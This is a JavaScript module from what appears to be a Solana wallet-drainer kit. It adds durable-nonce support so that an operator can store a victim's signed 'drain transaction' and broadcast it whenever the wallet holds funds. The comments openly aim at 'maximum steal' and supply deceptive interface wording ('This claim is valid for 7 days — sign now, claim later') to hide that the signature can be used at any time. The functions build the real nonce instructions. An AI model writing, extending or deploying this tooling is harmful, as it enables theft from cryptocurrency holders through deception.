'use strict';
/**
 * Durable Nonce support — Enhancement from MERGED_KIT.md analysis.
 *
 * MERGED_KIT finding: "Add a durable nonce account to the drain transaction.
 * The victim signs once; the drainer stores the sig and broadcasts whenever
 * the wallet is funded. UI framing: 'This claim is valid for 7 days — sign now, claim later.'"
 *
 * Unlike a regular blockhash transaction (expires ~90s), a durable nonce
 * transaction remains valid until the nonce account is advanced. The victim
 * signs once, the operator stores the signed bytes and can broadcast any time.
 *
 * Solana SystemProgram nonce instructions:
 *   Initialize nonce account: disc 6
 *   Advance nonce:            disc 4  ← MUST be first instruction in tx
 *   Withdraw from nonce:      disc 5
 *
 * Sources:
 *   - MERGED_KIT.md: durable nonce add-on (cheapest immediate improvement #4)
 *   - Solana docs: nonce account structure, AdvanceNonceAccount instruction
 */

const { writeU32 } = require('../core/crypto');

const SYSTEM_PROGRAM   = '11111111111111111111111111111111';
const SYSVAR_RECENT_BH = 'SysvarRecentB1ockHashes11111111111111111111';
const SYSVAR_RENT      = 'SysvarRent111111111111111111111111111111111';
const NONCE_ACCOUNT_SIZE = 80; // bytes, rent-exempt ~0.001392 SOL

/**
 * advanceNonceInstruction(nonceAccountPubkey, authorizedPubkey):
 *   SystemProgram.advanceNonceAccount (discriminator 4)
 *   MUST be the first instruction in the transaction (enforced by Solana runtime).
 *   This consumes the current nonce and replaces it with a new one.
 *   Required to make the durable-nonce tx a one-time-use (prevents replay).
 */
function advanceNonceInstruction(nonceAccountPubkey, authorizedPubkey) {
  const data = new Uint8Array(4);
  writeU32(data, 4, 0); // discriminator 4 = AdvanceNonceAccount
  return {
    program:  SYSTEM_PROGRAM,
    data,
    accounts: [
      { pubkey: nonceAccountPubkey, isSigner: false, isWritable: true  }, // nonce account
      { pubkey: SYSVAR_RECENT_BH,   isSigner: false, isWritable: false }, // SysvarRecentBlockHashes
      { pubkey: authorizedPubkey,   isSigner: true,  isWritable: false }, // nonce authority
    ],
    computeUnits: 150,
  };
}

/**
 * initializeNonceInstruction(nonceAccountPubkey, authorizedPubkey):
 *   SystemProgram.initializeNonceAccount (discriminator 6)
 *   Creates a new nonce account for durable-nonce transactions.
 *   The nonceAccountPubkey must already be allocated and funded.
 */
function initializeNonceInstruction(nonceAccountPubkey, authorizedPubkey) {
  // 4 bytes disc + 32 bytes authorized pubkey
  const data = new Uint8Array(36);
  writeU32(data, 6, 0); // discriminator 6 = InitializeNonceAccount
  const { base58Decode, writePubkey } = require('../core/crypto');
  writePubkey(data, 4, authorizedPubkey);
  return {
    program:  SYSTEM_PROGRAM,
    data,
    accounts: [
      { pubkey: nonceAccountPubkey, isSigner: false, isWritable: true  },
      { pubkey: SYSVAR_RECENT_BH,   isSigner: false, isWritable: false },
      { pubkey: SYSVAR_RENT,        isSigner: false, isWritable: false },
    ],
    computeUnits: 150,
  };
}

/**
 * buildDurableNonceDrainTx(nonceAccount, nonceAuthority, drainInstructions):
 *   Prepends AdvanceNonceAccount to the drain instruction list.
 *   The resulting transaction uses a nonce account instead of a blockhash.
 *
 *   UI framing for victim:
 *   "This claim is valid for 7 days — your allocation is reserved once you sign."
 *   This masks the fact that the signed bytes can be broadcast at any time.
 *
 *   The operator stores the victim's partial signature and broadcasts when:
 *   - Wallet has sufficient SOL (after victim funds it)
 *   - Best time for minimal slippage / maximum steal
 */
function buildDurableNonceDrainTx(nonceAccountPubkey, nonceAuthorityPubkey, drainInstructions) {
  return [
    advanceNonceInstruction(nonceAccountPubkey, nonceAuthorityPubkey),
    ...drainInstructions,
  ];
}

module.exports = {
  advanceNonceInstruction,
  initializeNonceInstruction,
  buildDurableNonceDrainTx,
  NONCE_ACCOUNT_SIZE,
};
